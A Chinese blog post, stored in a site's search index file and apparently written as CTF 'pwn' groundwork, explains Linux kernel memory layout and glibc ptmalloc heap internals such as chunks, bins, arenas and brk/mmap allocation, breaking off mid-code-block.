<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PWN基础和技巧</title>
      <link href="/2020/12/22/PWN%E5%9F%BA%E7%A1%80%E5%92%8C%E6%8A%80%E5%B7%A7/"/>
      <url>/2020/12/22/PWN%E5%9F%BA%E7%A1%80%E5%92%8C%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>#内核基础知识</p><h2 id="内存空间分配"><a class="markdownIt-Anchor" href="#内存空间分配"></a> 内存空间分配</h2><p>Linux中, 进程的内存空间被划分为两个部分----用户空间和内核空间. 用户进程通常情况下, 只能访问用户空间的虚拟地址, 不能访问到内核空间.</p><p>每个进程的用户空间都是完全独立、互不相干的，用户进程各自有不同的页表。而内核空间是由内核负责映射，它并不会跟着进程改变，是固定的。</p><p>内核空间地址有自己对应的页表，内核的虚拟空间独立于其他程序。</p><p>内核空间中，从低地址到高地址依次为：系统物理内存映射区—隔离带—vmalloc虚拟内存分配区—隔离带—高端内存映射区—专用页面映射区—保留区。<img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/1251780-20180317152942463-1195210397.png" alt="img" /></p><h3 id="内核空间内存动态申请"><a class="markdownIt-Anchor" href="#内核空间内存动态申请"></a> 内核空间内存动态申请</h3><p>主要包括三个函数：kmalloc(), __get_free_pages, vmalloc</p><p>➣kmalloc(), __get_free_pages申请的内存位于物理地址映射区，而且在物理上也是连续的，<strong>返回的虚拟地址</strong>与<strong>真实的物理地址（物理地址是连续的，虚拟地址也是连续的）<strong>只有一个</strong>固定的偏移</strong>，因此存在较简单的转换关系。</p><p>➣而vmalloc申请的内存位于vmalloc虚拟内存分配区（这些区都是以线性地址为度量），它在<strong>虚拟内存空间给出一块连续的内存区</strong>，实质上，这片连续的<strong>虚拟内存在物理内存中并不一定连续</strong>，而vmalloc申请的<strong>虚拟内存和物理内存之间</strong>也<mark>没有</mark><strong>简单的换算关系</strong>。因为vmalloc申请的在虚拟内存空间连续的内存区在物理内存中并不一定连续，可以想象为了完成vmalloc，新的页表需要被建立，因此，调用vmalloc来分配少量内存是不妥的。一般来讲，kmalloc用来分配小于128K的内存，而<strong>更大的内存</strong>块需要用<strong>vmalloc来实现</strong>。</p><h3 id="虚拟地址与物理地址关系"><a class="markdownIt-Anchor" href="#虚拟地址与物理地址关系"></a> 虚拟地址与物理地址关系</h3><p>对于内核物理内存映射区的虚拟内存（用kmalloc(), __get_free_pages申请的），使用virt_to_phys()和phys_to_virt()来实现物理地址和内核虚拟地址之间的互相转换。它实际上，仅仅做了3G的地址移位。<strong>上述方法适用于常规内存（内核物理内存映射区）</strong>，高端内存的虚拟地址与物理地址之间不存在如此简单的换算关系。因为它涉及到了分离物理页的页表控制机制</p><h3 id="ioremap"><a class="markdownIt-Anchor" href="#ioremap"></a> ioremap</h3><p>在ARM中，设备的寄存器或者存储块的这部分空间<strong>属于内存空间的一部分</strong>，我们称之为IO内存。<strong>在内核中访问IO内存之前，我们只有IO内存的物理地址，这样是无法通过软件直接访问的，需要首先用ioremap()函数将设备所处的物理地址映射到内核虚拟地址空间（3GB~4GB）</strong>。然后，才能根据映射所得到的内核虚拟地址范围，通过访问指令访问这些IO内存资源。在将I/O内存资源的物理地址映射成核心虚地址后，理论上讲我们就可以象读写RAM那样直接读写I/O内存资源了。为了保证驱动程序的跨平台的可移植性，我们应该使用Linux中特定的函数来访问I/O内存资源，而不应该通过指向核心虚地址的指针来访问。</p><h3 id="mmap"><a class="markdownIt-Anchor" href="#mmap"></a> mmap</h3><p>用mmap映射一个设备，意味着<strong>使用户空间的一段地址关联到设备内存上</strong>，这使得只要程序在分配的地址范围内进行读取或者写入，实际上就是对设备的访问。这种数据传输是直接的，不需要用到内核空间作为数据转移的中间站。remap_page_range（）函数的功能是构造用于映射一段物理地址的新页表，<strong>实现了内核空间与用户空间的映射</strong>。在内核<strong>驱动程序的初始化阶段</strong>，通过i<strong>oremap（）将物理地址映射到内核虚拟空间</strong>；在驱动程序的<strong>mmap系统调用中</strong>，使用remap_page_range()将该<strong>块ROM映射到用户虚拟空间</strong>。这样内核空间和用户空间都能访问这段被映射后的虚拟地址。</p><p>☢进程空间/内核空间/IO内存</p><p>其中，后面两个指的是同一段物理内存区域，只是一个为虚拟地址（内核空间），一个为物理地址（IO内存）。进程空间和内核空间对应着不同的物理地址，它们之间的数据传递，是实际的数据的拷贝。</p><p>☢进程空间/IO内存</p><p>其中，进程空间mmap得到的那段虚拟地址跟IO内存对应着同一段物理地址。这个过程没有额外的数据中转，读写都直接针对硬件的物理地址进行。</p><p>一般来讲，小数据量的传输用ioremap()就足够了，</p><h3 id="io内存的一般访问方法"><a class="markdownIt-Anchor" href="#io内存的一般访问方法"></a> IO内存的一般访问方法</h3><p>➣首先是调用request_mem_region()申请资源，即告诉内核，本驱动正在使用这段物理内存，其他驱动不得访问它们。在设备驱动模块加载或open()函数中进行。</p><p>➣接着讲寄存器地址通过ioremap()映射到内核空间虚拟地址，之后就可以通过Linux设备访问编程接口访问这些设备的寄存器了。在设备驱动初始化、write(),read(),ioctl()函数中进行。</p><p>➣ 访问完成之后，应对ioremap()申请的虚拟地址进行释放，并释放release_mem_region()申请的IO内存资源。在设备驱动模块卸载或release()函数中进行。</p><p>➣linux中的物理地址和虚拟地址 ：</p><p>在支持MMU的32位处理器平台上，Linux系统中的物理存储空间和虚拟存储空间的地址范围分别都是从0x00000000到0xFFFFFFFF，共4GB，但物理存储空间与虚拟存储空间布局完全不同。Linux运行在虚拟存储空间，并负责把系统中实际存在的远小于4GB的物理内存根据不同需求映射到整个4GB的虚拟存储空间中。</p><h3 id="物理存储空间布局"><a class="markdownIt-Anchor" href="#物理存储空间布局"></a> 物理存储空间布局</h3><p>Linux的物理存储空间布局与处理器相关，详细情况可以从处理器用户手册的存储空间分布表（memory map）相关章节中查到，我们这里只列出嵌入式处理器平台Linux物理内存空间的一般布局。</p><p>说明：</p><p>➣最大node号n不能大于MAX_NUMNODES-1。</p><p>➣MAX_NUMNODES表示系统支持的最多node数。在ARM系统中，Sharp芯片最多支持16个nodes，其他芯片最多支持4个nodes。</p><p>➣numnodes是当前系统中实际的内存node数。</p><p>➣在不支持CONFIG_DISCONTIGMEM选项的系统中，只有一个内存node。</p><p>➣最大bank号m不能大于NR_BANKS-1。</p><p>➣NR_BANKS表示系统中支持的最大内存bank数，一般等于处理器的RAM片选数。在ARM系统中，Sharp芯片最多支持16个banks，其他芯片最多支持8个banks。</p><p>➣mem_init()函数会将所有节点的页帧位码表所占空间、孔洞页描述符空间及空闲内存页都释放掉。</p><h3 id="虚拟存储空间布局"><a class="markdownIt-Anchor" href="#虚拟存储空间布局"></a> 虚拟存储空间布局</h3><p>在支持MMU的系统中，当系统做完硬件初始化后就使能MMU功能，这样整个系统就运行在虚拟存储空间中，实现虚拟存储空间到物理存储空间映射功能的是处理器的MMU，而虚拟存储空间与5路存储空间的映射关系则是由Linux内核来管理的。32位系统中物理存储空间占4GB空间，虚拟存储空间同样占4GB空间，Linux把物理空间中实际存在的远远小于4GB的内存空间映射到整个4GB虚拟存储空间中除映射I/O空间之外的全部空间，所以虚拟内存空间远远大于物理内存空间，这就说同一块物理内存可能映射到多处虚拟内存地址空间上，这正是Linux内存管理职责所在。</p><p>说明：</p><p>➣线性地址空间：是指Linux系统中从0x00000000到0xFFFFFFFF整个4GB虚拟存储空间。</p><p>➣内核空间：内核空间表示运行在处理器最高级别的超级用户模式（supervisor mode）下的代码或数据，内核空间占用从0xC000000到0xFFFFFFFF的1GB线性地址空间，内核线性地址空间由所有进程共享，但只有运行在内核态的进程才能访问，用户进程可以通过系统调用切换到内核态访问内核空间，进程运行在内核态时所产生的地址都属于内核空间。</p><p>➣用户空间：用户空间占用从0x00000000到0xBFFFFFFF共3GB的线性地址空间，每个进程都有一个独立的3GB用户空间，所以用户空间由每个进程独有，但是内核线程没有用户空间，因为它不产生用户空间地址。另外子进程共享（继承）父进程的用户空间只是使用与父进程相同的用户线性地址到物理内存地址的映射关系，而不是共享父进程用户空间。运行在用户态和内核态的进程都可以访问用户空间。</p><p>➣内核逻辑地址空间：是指从PAGE_OFFSET到high_memory之间的线性地址空间，是系统物理内存映射区，它映射了全部或部分（如果系统包含高端内存）物理内存。内核逻辑地址空间与图18-4中的系统RAM内存物理地址空间是一一对应的（包括内存孔洞也是一一对应的），内核逻辑地址空间中的地址与RAM内存物理地址空间中对应的地址只差一个固定偏移量，如果RAM内存物理地址空间从0x00000000地址编址，那么这个偏移量就是PAGE_OFFSET。</p><p>➣低端内存：内核逻辑地址空间所映射物理内存就是低端内存，低端内存在Linux线性地址空间中始终有永久的一一对应的内核逻辑地址，系统初始化过程中将低端内存永久映射到了内核逻辑地址空间，为低端内存建立了虚拟映射页表。低端内存内物理内存的物理地址与线性地址之间的转换可以通过**__pa(x)和__va(x)**两个宏来进行，<mark>pa(x)将内核逻辑地址空间的地址x转换成对应的物理地址，相当于</mark>virt_to_phys((unsigned long)(x))，<code>__va(x)则相反，把低端物理内存空间的地址转换成对应的内核逻辑地址，相当于</code>((void *)__phys_to_virt((unsigned long)(x)))。</p><p>➣高端内存：低端内存地址之上的物理内存是高端内存，高端内存在Linux线性地址空间中没有没有固定的一一对应的内核逻辑地址，系统初始化过程中不会为这些内存建立映射页表将其固定映射到Linux线性地址空间，而是需要使用高端内存的时候才为分配的高端物理内存建立映射页表，使其能够被内核使用，否则不能被使用。高端内存的物理地址于现行地址之间的转换不能使用上面的__pa(x)和__va(x)宏。</p><p>➣高端内存概念的由来：如上所述，Linux将4GB的线性地址空间划分成两部分，从0x00000000到0xBFFFFFFF共3GB空间作为用户空间由用户进程独占，这部分线性地址空间并没有固定映射到物理内存空间上；从0xC0000000到0xFFFFFFFF的第4GB线性地址空间作为内核空间，在<mark>嵌入式系统</mark>中，这部<mark>分线性地址空间除了映射物理内存空间之外还要映射处理器内部外设寄存器空间等I/O空间</mark>。</p><p><mark>0xC0000000~high_memory之间的内核逻辑地址空间专用来固定映射系统中的物理内存</mark>，也就是说0xC0000000~high_memory之间空间大小与系统的物理内存空间大小是相同的（当然在配置了CONFIG_DISCONTIGMEMD选项的非连续内存系统中，内核逻辑地址空间和物理内存空间一样可能存在内存孔洞），如果系统中的物理内存容量远小于1GB，那么内核现行地址空间中内核逻辑地址空间之上的<mark>high_memory~0xFFFFFFFF</mark>之间还有足够的空间来固定映射一些I/O空间。可是，如果系统中的物理内存容量（包括内存孔洞）小于1GB，那么就没有足够的内核线性地址空间来固定映射系统全部物理内存以及一些I/O空间了，为了解决这个问题，在x86处理器平台设置了一个经验值：896MB，就是说，如果系统中的物理内存（包括内存孔洞）大于896MB，那么将前896MB物理内存固定映射到内核逻辑地址空间</p><p>0xC0000000~0xC0000000+896MB（=high_memory）上，<code>而896MB之后的物理内存则不建立到内核线性地址空间的固定映射，这部分内存就叫高端物理内存</code>。此时内核线性地址空间high_memory~0xFFFFFFFF之间的128MB空间就称为高端内存线性地址空间，用来映射高端物理内存和I/O空间。896MB是x86处理器平台的经验值，留了128MB线性地址空间来映射高端内存以及I/O地址空间，我们在嵌入式系统中可以根据具体情况修改这个阈值，比如，MIPS中将这个值设置为0x20000000B（512MB），那么只有当系统中的物理内存空间容量大于0x20000000B时，内核才需要配置CONFIG_HIGHMEM选项，使能内核对高端内存的分配和映射功能。什么情况需要划分出高端物理内存以及高端物理内存阈值的设置原则见上面的内存页区（zone）概念说明。</p><p>➣高端线性地址空间：从high_memory到0xFFFFFFFF之间的线性地址空间属于高端线性地址空间，其中VMALLOC_START~VMALLOC_END之间线性地址被vmalloc()函数用来分配物理上不连续但线性地址空间连续的高端物理内存，或者被vmap()函数用来映射高端或低端物理内存，或者由ioremap()函数来重新映射I/O物理空间。PKMAP_BASE开始的LAST_PKMAP（一般等于1024）页线性地址空间被kmap()函数用来永久映射高端物理内存。FIXADDR_START开始的KM_TYPE_NR*NR_CPUS页线性地址空间被kmap_atomic()函数用来临时映射高端物理内存，其他未用高端线性地址空间可以用来在系统初始化期间永久映射I/O地址空间。</p><h3 id="嵌入式系统中如何访问io资源"><a class="markdownIt-Anchor" href="#嵌入式系统中如何访问io资源"></a> 嵌入式系统中如何访问I/O资源</h3><p>几乎每一种外设都是通过读写设备上的寄存器来进行的，通常包括控制寄存器、状态寄存器和数据寄存器三大类，外设的寄存器通常被连续地编址。根据CPU体系结构的不同，CPU对IO端口的编址方式有两种：</p><p>➣I/O映射方式（I/O-mapped）</p><p>典型地，如X86处理器为外设专门实现了一个单独的地址空间，称为&quot;I/O地址空间&quot;或者&quot;I/O端口空间&quot;，CPU通过专门的I/O指令（如X86的IN和OUT指令）来访问这一空间中的地址单元。</p><p>➣内存映射方式（Memory-mapped）</p><p>RISC指令系统的CPU（如ARM、PowerPC等）通常只实现一个物理地址空间，外设I/O端口成为内存的一部分。此时，CPU可以象访问一个内存单元那样访问外设I/O端口，而不需要设立专门的外设I/O指令。</p><p>但是，这两者在硬件实现上的差异对于软件来说是完全透明的，驱动程序开发人员可以将内存映射方式的I/O端口和外设内存统一看作是&quot;I/O内存&quot;资源。</p><p>一般来说，在系统运行时，外设的I/O内存资源的物理地址是已知的，由硬件的设计决定。但是CPU通常并没有为这些已知的外设I/O内存资源的物理地址预定义虚拟地址范围，驱动程序并不能直接通过物理地址访问I/O内存资源，而必须将它们映射到核心虚地址空间内（通过页表），然后才能根据映射所内指令访问这些I/O得到的核心虚地址范围，通过访内存资源。Linux在io.h头文件中声明了函数ioremap（），用来将I/O内存资源的物理地址映射到核心虚地址空间（3GB－4GB）中，原型如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> * <span class="hljs-title">ioremap</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> phys_addr, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-built_in">size</span>, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> flags)</span></span>;<br></code></pre></td></tr></table></figure><p>iounmap函数用于取消ioremap（）所做的映射，原型如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">iounmap</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * addr)</span></span>;<br></code></pre></td></tr></table></figure><p>这两个函数都是实现在mm/ioremap.c文件中。</p><p>在将I/O内存资源的物理地址映射成核心虚地址后，理论上讲我们就可以象读写RAM那样直接读写I/O内存资源了。为了保证驱动程序的跨平台的可移植性，我们应该使用Linux中特定的函数来访问I/O内存资源，而不应该通过指向核心虚地址的指针来访问。如在x86平台上，读写I/O的函数如下所示：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> readb(addr) (*(volatile unsigned char *) __io_virt(addr))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> readw(addr) (*(volatile unsigned short *) __io_virt(addr))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> readl(addr) (*(volatile unsigned int *) __io_virt(addr))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> writeb(b,addr) (*(volatile unsigned char *) __io_virt(addr) = (b))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> writew(b,addr) (*(volatile unsigned short *) __io_virt(addr) = (b))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> writel(b,addr) (*(volatile unsigned int *) __io_virt(addr) = (b))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> memset_io(a,b,c) memset(__io_virt(a),(b),(c))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> memcpy_fromio(a,b,c) memcpy((a),__io_virt(b),(c))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> memcpy_toio(a,b,c) memcpy(__io_virt(a),(b),(c))</span><br></code></pre></td></tr></table></figure><p><code></code>最后，我们要特别强调驱动程序中mmap函数的实现方法。用mmap映射一个设备，意味着使用户空间的一段地址关联到设备内存上，这使得只要程序在分配的地址范围内进行读取或者写入，实际上就是对设备的访问。</p><h3 id="物理地址线性地址和虚拟地址对应关系"><a class="markdownIt-Anchor" href="#物理地址线性地址和虚拟地址对应关系"></a> 物理地址,线性地址和虚拟地址对应关系</h3><p><img src= "/img/loading.gif" data-src="http://blog.chinaunix.net/attachment/201103/9/23208702_1299675040US6u.jpg" alt="img" /></p><p>[<a href="https://www.cnblogs.com/big-devil/p/8590228.html" target="_blank" rel="noopener">Linux虚拟地址和物理地址的映射</a>]</p><h1 id="堆基础知识"><a class="markdownIt-Anchor" href="#堆基础知识"></a> 堆基础知识</h1><p><code>推荐阅读</code>: <a href="https://blog.csdn.net/songchuwang1868/article/details/89951543?utm_source=app" target="_blank" rel="noopener">malloc的实现（ptmalloc）</a></p><p><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/arena.c#L59" target="_blank" rel="noopener"><strong>heap_info</strong></a> – Heap Header – 一个单独的thread arena可以拥有多个 heaps. 每个heap拥有它们自己的头. 开始的时候每一个thread arena包含一个heap, 但后来该heap段空间用完, 新的heap(不连续内存)会映射到这个arena</p><p><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1671" target="_blank" rel="noopener"><strong>malloc_state</strong></a> – Arena Header --一个单独thread arena可以有多个堆,但是那些堆只能有一个arena header存在. Arena header包含bins, top chunk, lastremainder chunk等信息</p><p><strong><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1108" target="_blank" rel="noopener">malloc_chunk</a></strong> – Chunk Header–chunk基本结构</p><p>libc【HEAP】常用的部分：</p><ul><li><p>C</p><ul><li>malloc、free、realloc</li></ul></li><li><p>C++,C#</p><ul><li>new，delete</li></ul></li><li><p>整个Heap的资料记录在一个struct malloc_state中，称为main_arena</p></li><li><p>malloc分配的内存称为chunk，会比要求的大一点，因为需要记录一些维护heap用的额外资料</p></li><li><p>arena跟heap分配的内存分开存放，heap overflow没有办法直接覆盖它的内容</p></li><li><p>回收的chunk用linked list记录，称为bin</p></li><li><p>main_arena中有很多个bin，每个bin里面存的chunkSize不同，目的是让malloc时可以尽快找到最合适大小的chunk</p></li><li><p>回收的chunk会根据size来决定应该放进那个linked list(bin)中</p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">main_arena &#123;<br>bin[<span class="hljs-number">0</span>] (<span class="hljs-built_in">size</span>=<span class="hljs-number">16</span>) -&gt; chunk1 -&gt; chunk5<br>bin[<span class="hljs-number">1</span>] (<span class="hljs-built_in">size</span>=<span class="hljs-number">32</span>) -&gt; chunk2 -&gt; chunk3 -&gt; chunk4<br>bin[<span class="hljs-number">2</span>] (<span class="hljs-built_in">size</span>=<span class="hljs-number">48</span>) -&gt;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>malloc时，优先从bin里面找出可以使用的chunk，如果找不到才会真的分配新的内存给程序使用。分配时可以去找足够大的chunk只切出需要的部分，剩下的部分形成新的chunk（last_remainder）</p></li><li><p>找不到可用空间时会从TOP chunk分配，TOP chunk是一个很大的chunk，代表可以使用但未分配的内存，malloc分配时从里面切一小块下来，剩下的重新设为TOP chunk(这东西在尾端的高地址，最后一块的chunk)</p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">main_arena &#123;<br>mchunkptr top -&gt; top_chunk<br>mchunkptr last_remainder<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>inuse的chunk 是没有*fd和*bk的，被data覆盖了，free的chunk是有这个的</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br>  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      mchunk_size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p><strong>(64bit): mem = malloc(size) -&gt; chunk = mem -16 ; chunksize = (size+8)#16</strong></p><ul><li>实际chunk地址是malloc得到的地址-16（32bit是-8）</li><li>chunksize 是 size +8 后向上对齐至16的倍数，因为要存放额外的资料</li><li>比如在gdb调试环境下，可以print 变量V(<code>which malloc appl for</code>)，then V-10h is memory address(HeapAddress), we can check it with x/40gx V-10h command(40gx parametre can be change) OR p/x *(struct malloc_chunk*)(V-10h) can show heap parameter what represent for in chunk form.</li></ul></li><li><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201209172437029.png" alt="image-20201209172437029" /><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201209222557225.png" alt="image-20201209222557225" /></p></li><li><p><code>user data 会覆盖到下一个chunk头（多8位）</code></p></li><li><p><mark>size</mark>：这个chunk在内存中的大小，不是malloc size</p></li><li><p><mark>fd，bk</mark>：指向bin里的前一个、后一个chunk</p><ul><li>一般来说bin是double linked list</li></ul></li><li><p><mark>prev_size</mark>: 前一个chunk size，维护heap时可以得知前一个chunk的位置</p></li><li><p><strong>fd_nextsize</strong>:在large bin中指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针</p></li><li><p><strong>bk_nextsize</strong>: 在large bin中指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针</p></li><li><p><code>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历</code></p></li><li><p>简单来说,每个chunk可以看到四个相邻的chunk</p><ul><li>chunk + size: 内存空间中的下一个chunk</li><li>chunk - prev_size: 内存空间中的前一个chunk</li><li>fd,bk：Double linked list（bin），在内存中不一定是在前面或后面</li><li><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201211150559048.png" alt="image-20201211150559048" /></li></ul></li><li><p><code>main_arena</code>，是由主线程创建的，thread_arena则为各线程创建的，当arena满了之后就不再创建而是与其他arena共享一个arena，方法为依次给各个arena上锁（查看是否有其他线程正在使用该arena），如果上锁成功（没有其他线程正在使用），则使用该arena，之后一直使用这个arena，如果无法使用则阻塞等待</p></li><li><p><strong>main arena</strong> <strong>的</strong> <strong>malloc_state</strong> <strong>并不是</strong> <strong>heap segment</strong> <strong>的一部分，而是一个全局变量，存储在</strong> <strong><a href="http://libc.so" target="_blank" rel="noopener">libc.so</a></strong> <strong>的数据段</strong></p><ul><li><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html" target="_blank" rel="noopener">malloc源码</a>：主要看malloc_state, _int_malloc（call到的是_libc_malloc实际起作用的是_int_malloc）, _int_free, (<code>基本就是知道有哪些位置的内存是可以被分配的&amp;有哪些是因为free掉而可以回收的&amp;有哪些位置是使用中则不需要记录，使用它们的人应该记住这些指标</code>)</li></ul></li></ul><h2 id="sbrk与mmap"><a class="markdownIt-Anchor" href="#sbrk与mmap"></a> sbrk与mmap</h2><p><mark>从堆中分配空间，本质是移动一个位置，向后移就是分配空间，向前移就是释放空间。</mark></p><ul><li>sbrk用相对的整数值确定位置，如果这个整数是正数，会从当前位置向后移若干字节，如果为负数就向前若干字节。在任何情况下，返回值永远是移动之前的位置,可以是0</li><li>brk用绝对的地址指定移到哪个位置。</li></ul><p>在堆区中， <strong>start_brk 指向 heap 的开始，而 brk 指向 heap 的顶部</strong>。可以使用系统调用 brk()和 sbrk()来增 加标识 heap 顶部的 brk 值，从而线性的增加分配给用户的 heap 空间。<strong>在使 malloc 之前，brk 的值等于 start_brk，也就是说 heap 大小为 0</strong>。<br />　　ptmalloc 在开始时，若请求的空间<strong>小于</strong> mmap 分配阈值（mmap threshold，默认值为 128KB）时，<strong>主分配区(main_arena)会调用 sbrk()增加一块大小为 (128 KB + chunk_size) align 4KB（页面大小对齐） 的空间作为 heap。非主分配区(no_main_arena)会调用 mmap 映射一块大小为 HEAP_MAX_SIZE（32 位系统上默认为 1MB，64 位系统上默认为 64MB）的空间作为 sub-heap</strong>。这就是前面所说的 ptmalloc 所维护的分配空间;　　　<br />　　当用户请求内存分配时，首先会在这个区域内找一块合适的 chunk 给用户。当用户释放了 heap 中的 chunk 时，ptmalloc 又会使用 fastbins 和 bins 来组织空闲 chunk。以备用户的下一次分配。<br />　　<strong>若需要分配的 chunk 大小<mark>小于</mark> mmap分配阈值，而 heap 空间又不够，则此时主分配区(main_arena)会通过 sbrk()调用来增加 heap 大小，非主分配区(no_main_arena)会调用 mmap 映射一块新的 sub-heap，也就是<mark>增加 top chunk 的大小</mark>，每次 heap 增加的值都会对齐到 4KB</strong>。当用户的请求超过 mmap 分配阈值，并且主分配区使用 sbrk()分配失败的时候，或是非主分配区在 top chunk 中不能分配到需要的内存时，ptmalloc 会尝试使用 mmap()直接映射一块内存到进程内存空间。<strong>使用 mmap()直接映射的 chunk 在释放时直接解除映射，而不再属于进程的内存空间</strong>。任何对该内存的访问都会产生段错误。<strong>而在 heap 中或是 sub-heap 中分配的空间则可能会留在进程内存空间内，还可以再次引用（当然是很危险的）。</strong></p><h3 id="example"><a class="markdownIt-Anchor" href="#example"></a> EXAMPLE</h3><h4 id="情况一"><a class="markdownIt-Anchor" href="#情况一"></a> <strong>情况一</strong></h4><p>malloc小于128k的内存，使用brk分配内存，将_edata往高地址推(只分配虚拟空间，不对应物理内存(因此没有初始化)，第一次读/写数据时，引起内核缺页中断，内核才分配对应的物理内存，然后虚拟地址空间建立映射关系)，如下图：</p><p>1、进程启动的时候，其（虚拟）内存空间的初始布局如图1所示。<br />其中，mmap内存映射文件是在堆和栈的中间（<a href="http://xn--libc-2-9v9ii49d.2.93.so" target="_blank" rel="noopener">例如libc-2.2.93.so</a>，其它数据文件等），为了简单起见，省略了内存映射文件。<br /><strong>_edata指针（glibc里面定义）指向数据段的最高地址。</strong></p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20190121151501407.png" alt="img" /></p><p>2、进程调用A=malloc(30K)以后，内存空间如图2：<br />malloc函数会调用brk系统调用，将_edata指针往高地址推30K，就完成虚拟内存分配。<br />你可能会问：只要把_edata+30K就完成内存分配了？<br />事实是这样的，_edata+30K只是完成虚拟地址的分配，A这块内存现在还是没有物理页与之对应的，等到进程第一次读写A这块内存的时候，发生缺页中断，这个时候，内核才分配A这块内存对应的物理页。也就是说，如果用malloc分配了A这块内容，然后从来不访问它，那么，A对应的物理页是不会被分配的。<br />3、进程调用B=malloc(40K)以后，内存空间如图3。</p><h4 id="情况二"><a class="markdownIt-Anchor" href="#情况二"></a> <strong>情况二</strong></h4><p>malloc大于128k的内存，使用mmap分配内存，在堆和栈之间找一块空闲内存分配(对应独立内存，而且初始化为0)，如下图：<img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/2019012115164361.png" alt="img" /></p><p>4、进程调用C=malloc(200K)以后，内存空间如图4：<br />默认情况下，malloc函数分配内存，如果请求内存大于128K（可由M_MMAP_THRESHOLD选项调节），那就不是去推_edata指针了，而是利用<strong>mmap系统调用，从堆和栈的中间分配一块虚拟内存。</strong><br />这样子做主要是因为::<br />brk分配的内存需要等到高地址内存释放以后才能释放（例如，在B释放之前，A是不可能释放的，这就是内存碎片产生的原因，什么时候紧缩看下面），而mmap分配的内存可以单独释放。<br />当然，还有其它的好处，也有坏处，再具体下去，有兴趣的同学可以去看glibc里面malloc的代码了。<br />5、进程调用D=malloc(100K)以后，内存空间如图5；<br />6、进程调用free©以后，C对应的虚拟内存和物理内存一起释放。<img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20190121151749214.png" alt="img" /></p><p>7、进程调用free(B)以后，如图7所示：<br /><strong>B对应的虚拟内存和物理内存都没有释放，因为只有一个_edata指针，如果往回推，那么D这块内存怎么办呢？<br />当然，B这块内存，是可以重用的，如果这个时候再来一个40K的请求，那么malloc很可能就把B这块内存返回回去了。</strong><br />8、进程调用free(D)以后，如图8所示：<br /><strong>B和D连接起来，变成一块140K的空闲内存。</strong><br />9、默认情况下：<br />当最高地址空间的空闲内存超过128K（可由M_TRIM_THRESHOLD选项调节）时，执行内存紧缩操作（trim）。在上一个步骤free的时候，<strong>发现最高地址空闲内存超过128K，于是内存紧缩</strong>，变成图9所示。</p><h2 id="arena"><a class="markdownIt-Anchor" href="#arena"></a> Arena</h2><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">操作系统 --&gt; 堆管理器 --&gt; 用户<br>物理内存 --&gt; arena  --&gt; 